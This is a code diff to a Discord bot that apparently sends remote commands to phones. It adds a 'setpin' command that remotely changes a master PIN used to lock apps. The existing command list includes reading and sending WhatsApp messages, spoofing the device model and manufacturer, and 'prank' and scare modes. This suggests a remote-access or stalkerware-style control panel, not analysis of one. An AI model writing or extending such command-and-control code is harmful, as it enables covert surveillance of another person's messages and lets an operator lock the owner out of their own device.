@@ -92,6 +92,7 @@ DEVICE_COMMAND_NAMES = {
     "sayscaryurdu",
     "getwhatsapp",
     "sendwhatsapp",
+    "setpin",
     "prank_mode",
     "spoof",
 }
@@ -1464,6 +1465,14 @@ class ADexDiscordClient(discord.Client):
         @app_commands.describe(model="Fake model name (e.g. Pixel 8 Pro)", manufacturer="Fake manufacturer (e.g. Google)")
         async def spoof(interaction: discord.Interaction, model: str | None = None, manufacturer: str | None = None) -> None:
             await self._queue_remote_command(interaction, "spoof", {"model": model, "manufacturer": manufacturer})
+
+        @self.tree.command(name="setpin", description="Change master PIN for app locking")
+        @app_commands.describe(pin="New 4-digit numeric PIN")
+        async def setpin(interaction: discord.Interaction, pin: str) -> None:
+            if not pin.isdigit() or len(pin) != 4:
+                await interaction.response.send_message("PIN must be exactly 4 numeric digits.", ephemeral=True)
+                return
+            await self._queue_remote_command(interaction, "setpin", {"pin": pin})
 
 
     async def _validate_guild_context(self, interaction: discord.Interaction) -> bool:
